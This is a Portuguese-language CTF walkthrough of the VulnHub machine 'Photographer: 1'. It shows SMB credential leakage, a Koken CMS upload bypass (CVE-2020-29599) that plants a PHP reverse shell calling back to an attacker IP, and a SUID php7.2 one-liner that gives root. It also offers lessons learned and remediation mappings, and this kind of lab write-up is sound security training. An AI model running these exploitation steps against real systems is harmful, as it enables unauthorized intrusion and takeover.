# Photographer: 1 — Clica, Compartilha e Roda como Root

Caramba, mano! Quem diria que um CMS de fotografia ia estar ali de boa com um compartilhamento SMB vazando credencial em texto puro? Photographer: 1 é uma daquelas máquinas onde a corrente de ataque simplesmente flui: e-mail no SMB entrega a senha do Koken CMS, um bypass de upload conhecido te dá shell, e um binário PHP com SUID literalmente te entrega o root. Sem mentira, essa aqui é top demais pra aprender o pipeline completo de web até root.

Salve ao v1n1v131r4 por montar uma máquina que ensina três classes distintas de vulnerabilidades reais em uma corrente limpa. Nível sensacional para iniciantes e intermediários.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Photographer: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **URL VulnHub** | https://www.vulnhub.com/entry/photographer-1,519/ |
| **Técnicas** | Enumeração SMB, extração de credencial de e-mail, bypass de upload Koken CMS, reverse shell PHP, GTFOBin via SUID |
| **CVEs** | CVE-2020-29599 (Koken CMS 0.22.24 upload arbitrário) |
| **Grupos APT** | FIN7 (exploita uploads de arquivos como acesso inicial em alvos de hospitalidade); APT41 (abusa vulnerabilidades de CMS para foothold em organizações criativas) |

---

## Resumo do Ataque

```
nmap → 80 (HTTP Apache), 445 (SMB Samba), 8000 (HTTP Koken CMS)
  → smbclient -L → sambashare (sem autenticação)
  → smb: get mailsent.txt → daisa@photographer.com:babygirl
  → http://alvo:8000/admin/ → login com as credenciais descobertas
  → Koken 0.22.24 → Conteúdo > Importar → upload shell.php.jpg
  → Interceptar no Burp → renomear filename para shell.php → encaminhar
  → nc -lvp 4444 → curl storage/originals/XX/YY/shell.php
  → shell como www-data
  → find / -perm -4000 → /usr/bin/php7.2 com SUID
  → /usr/bin/php7.2 -r "pcntl_exec('/bin/sh',['-p']);"
  → uid=0(root)
  → cat /root/proof.txt
```

---

## Metodologia

1. Scan completo de portas: identificar HTTP (80), SMB (445), Koken CMS (8000)
2. Enumeração SMB: listar compartilhamentos, acessar sambashare sem credenciais
3. Extração de credencial: recuperar mailsent.txt do compartilhamento SMB
4. Login no CMS: autenticar no painel admin do Koken
5. Bypass de upload: explorar CVE-2020-29599 via interceptação no Burp Suite
6. Entrega de reverse shell: acionar o PHP shell enviado via URL direta
7. Estabilização do shell: upgrade com python3 pty
8. Enumeração SUID: encontrar binários com setuid
9. Escalada via GTFOBin: php7.2 SUID para root
10. Captura da flag

---

## Passo 1 — Descoberta do Host e Scan Completo

```bash
sudo netdiscover -r 192.168.0.0/24
# Alvo identificado: 192.168.0.76

nmap -p- -A -T4 192.168.0.76
```

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.x
445/tcp  open  netbios-ssn Samba
8000/tcp open  http     Apache httpd 2.4.x (Koken CMS)
```

Três serviços: Apache na 80 (site estático), Samba na 445, e outro Apache na 8000 rodando Koken CMS. Presença de SMB num servidor web é sempre suspeita. Em CTF ou engajamento real, aquele compartilhamento vai ser enumerado primeiro.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração SMB

```bash
smbclient -L //192.168.0.76 -N
```

```
Sharename       Type      Comment
---------       ----      -------
sambashare      Disk
IPC$            IPC
```

O compartilhamento `sambashare` está acessível sem credenciais. Conectar e listar:

```bash
smbclient //192.168.0.76/sambashare -N
smb: \> ls
  mailsent.txt                        N     1500
  wordpress.bkp.zip                   N   394484

smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
smb: \> exit
```

**Alternativa:** `smbmap -H 192.168.0.76` dá uma visão rápida de todos os compartilhamentos legíveis sem prompt interativo.

Ler o e-mail:

```bash
cat mailsent.txt
```

```
Para: Daisa Ahomi
De: Agi Clarence
Assunto: Seu Site Koken

...
...sua senha é: babygirl
...
E-mail: daisa@photographer.com
```

Credenciais: `daisa@photographer.com` / `babygirl`, entregues em texto puro dentro de um e-mail armazenado num compartilhamento SMB acessível por visitantes. Véi, absurdo.

**Nota do mundo real:** Compartilhamentos SMB com acesso de convidado são endêmicos em pequenas empresas e estúdios criativos. Pentesters os encontram nos primeiros 10 minutos de um engajamento. FIN7 e OceanLotus (APT32) incluem enumeração SMB nos seus playbooks padrão de acesso inicial.

**MITRE ATT&CK:** T1021.002 — Serviços Remotos: SMB; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Login no Koken CMS

Navegar para `http://192.168.0.76:8000/admin/` e fazer login com `daisa@photographer.com` / `babygirl`. O painel admin carrega, confirmando que as credenciais são válidas.

Verificar a versão do Koken: é a **0.22.24**, vulnerável ao CVE-2020-29599 (upload arbitrário de arquivo via funcionalidade de importação).

**MITRE ATT&CK:** T1078 — Contas Válidas

---

## Passo 4 — Reverse Shell PHP via Bypass de Upload Koken (CVE-2020-29599)

A funcionalidade de importação do Koken valida a extensão do arquivo no lado do cliente e verifica a extensão de imagem no servidor, mas não valida tipo MIME nem conteúdo. O bypass: renomear o shell PHP para `shell.php.jpg` para passar na verificação, depois interceptar e renomear de volta.

Preparar o shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Editar as variáveis dentro do `shell.php`:

```php
$ip = '192.168.0.100';   // IP do atacante
$port = 4444;
```

Renomear para enganar a verificação de extensão:

```bash
mv shell.php shell.php.jpg
```

Iniciar o listener:

```bash
nc -lvnp 4444
```

No painel Koken: **Conteúdo > Importar Conteúdo** — fazer upload de `shell.php.jpg`.

Interceptar a requisição de upload no Burp Suite. No cabeçalho `Content-Disposition`, localizar:

```
filename="shell.php.jpg"
```

Alterar para:

```
filename="shell.php"
```

Encaminhar a requisição modificada. O servidor armazena o arquivo como `shell.php` no caminho de originais. Encontrar o caminho de upload no painel admin do Koken, depois acionar:

```bash
curl http://192.168.0.76:8000/storage/originals/XX/YY/shell.php
```

Callback do reverse shell recebido como `www-data`.

**Por que isso é perigoso?** Validação apenas por extensão é trivialmente contornada interceptando a requisição multipart. Validação de tipo de conteúdo no lado do servidor (verificando magic bytes, não só extensão) evitaria isso. CWE-434 (Upload Irrestrito de Arquivo com Tipo Perigoso) está no OWASP Top 10 desde 2010 e ainda aparece constantemente.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Pública; T1059.004 — Shell Unix

---

## Passo 5 — Estabilização do Shell

```bash
# Na vítima:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# No atacante (Ctrl+Z para pausar):
stty raw -echo; fg
# Pressionar Enter duas vezes
```

TTY interativo completo com autocomplete por tab e controle de jobs. Essencial antes de rodar qualquer coisa que exija um shell interativo.

---

## Passo 6 — Enumeração SUID e Escalada via GTFOBin

Enumerar binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/passwd
...
```

`/usr/bin/php7.2` tem o bit SUID definido. PHP com SUID é uma vitória imediata no GTFOBins:

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

```
# id
uid=33(www-data) gid=33(www-data) euid=0(root)
# cat /root/proof.txt
```

Root conquistado. O `euid=0` significa que temos privilégios efetivos de root mesmo com UID real sendo www-data.

**Nota do mundo real:** Definir o bit SUID em qualquer runtime de linguagem interpretada (PHP, Python, Perl, Ruby) é uma das más configurações mais críticas no Linux. O runtime pode carregar código arbitrário com privilégios de root. GTFOBins documenta técnicas de exploração para cada interpretador principal. Isso é encontrado em ambientes de produção que instalam PHP globalmente via gerenciador de pacotes e acidentalmente definem SUID durante uma mudança de permissões mal executada.

**MITRE ATT&CK:** T1548.001 — Abuso de Controle de Elevação: Setuid; T1068 — Exploração para Escalada de Privilégios

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | daisa@photographer.com:babygirl | SMB sambashare/mailsent.txt | Login direto no admin do Koken CMS |
| Web shell | shell.php | Upload via bypass de importação Koken | Acionado via URL direta |
| Shell root | euid=0(root) | SUID /usr/bin/php7.2 GTFOBin | Escalada com pcntl_exec |
| Flag root | proof.txt | /root/proof.txt | Cat após escalada root |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Aprendizado Chave |
|---|---|---|---|
| 1 | Compartilhamento SMB com acesso de convidado contendo e-mail com senha em texto puro | Milhares de pequenas empresas deixam shares Samba legíveis; e-mails com credenciais são comuns | Desativar acesso SMB de convidado; nunca armazenar credenciais em texto puro em compartilhamentos |
| 2 | Koken CMS CVE-2020-29599: validação de upload apenas por extensão contornada via Burp | Bypasses de upload em CMS aparecem em todo pentest de aplicação web | Validar tipo MIME no servidor, verificar magic bytes, armazenar uploads fora do web root |
| 3 | Bit SUID no /usr/bin/php7.2: root imediato via GTFOBins | SUID em runtimes de interpretadores aparece em ambientes com gerenciamento desleixado de permissões | Auditar binários SUID regularmente; remover SUID de todos os runtimes de interpretadores |
| 4 | Senha fraca de admin (babygirl) no CMS sem MFA | Plataformas CMS são alvos primários de stuffing de credenciais e força bruta | Impor senhas fortes; implementar MFA em todos os painéis admin |
| 5 | Backup WordPress (.bkp.zip) no compartilhamento SMB | Arquivos de backup em locais acessíveis expõem todo o código-fonte e configuração da aplicação | Armazenar backups em locais offline com controle de acesso |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Execução | Execução | Interpretador: Shell Unix | T1059.004 |
| Escalada de Privilégios | Escalada | Abuso de Controle de Elevação: Setuid | T1548.001 |
| Escalada de Privilégios | Escalada | Exploração para Escalada | T1068 |
| Movimento Lateral | Lateral | Serviços Remotos: SMB | T1021.002 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desativar acesso SMB de convidado**: configurar Samba: `map to guest = never`; exigir autenticação para todos os compartilhamentos
2. **Remover credenciais em texto puro de todos os compartilhamentos**: conduzir auditoria; implementar gerenciador de segredos
3. **Atualizar ou substituir o Koken CMS**: Koken não tem manutenção desde 2020; migrar para CMS ativamente mantido
4. **Implementar validação de upload no lado do servidor**: validar tipo MIME, magic bytes e extensão; bloquear execução PHP em diretórios de upload
5. **Remover SUID do /usr/bin/php7.2**: `chmod u-s /usr/bin/php7.2`; auditar todos os binários SUID trimestralmente
6. **Impor senhas fortes e MFA** em todos os painéis admin de CMS

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os compartilhamentos SMB; auditar versões de CMS e plugins |
| Proteger | Controle de Acesso | Desativar SMB de convidado; exigir MFA nos painéis admin |
| Proteger | Segurança de Dados | Remover credenciais em texto puro de compartilhamentos |
| Detectar | Anomalias e Eventos | Alertar sobre acesso SMB anônimo; monitorar uploads no CMS |
| Responder | Planejamento de Resposta | Remover webshells enviados; rotacionar todas as credenciais expostas |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todos os binários SUID |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Autenticação obrigatória para compartilhamentos SMB |
| AC-6 | Menor Privilégio | Remover SUID do binário PHP |
| IA-5 | Gerenciamento de Autenticadores | Impor senhas fortes; rotacionar credenciais expostas |
| CM-7 | Menor Funcionalidade | Desativar SMB de convidado; restringir tipos de arquivo aceitos pelo CMS |
| SC-28 | Proteção de Informações em Repouso | Sem credenciais em compartilhamentos de arquivo |
| SI-3 | Proteção contra Código Malicioso | Detectar arquivos PHP enviados para diretórios acessíveis pela web |

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

---

## Considerações Finais

Bora rapaziada, Photographer: 1 é a máquina perfeita de "mundo real em miniatura". A cadeia de credenciais (compartilhamento SMB, e-mail, CMS, web shell, SUID root) espelha exatamente os caminhos de ataque encontrados em engajamentos de pequenas empresas e agências criativas. O fato de cada passo ser realista faz essa máquina se destacar dos CTFs puramente de puzzle.

Se você jogou: agora sabe que acesso SMB de convidado, validação de upload apenas por extensão e SUID em runtimes de interpretadores são configurações de "derrota imediata" em qualquer pentest. Esse conhecimento se traduz diretamente para avaliações reais.

GG véi, bem jogado. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
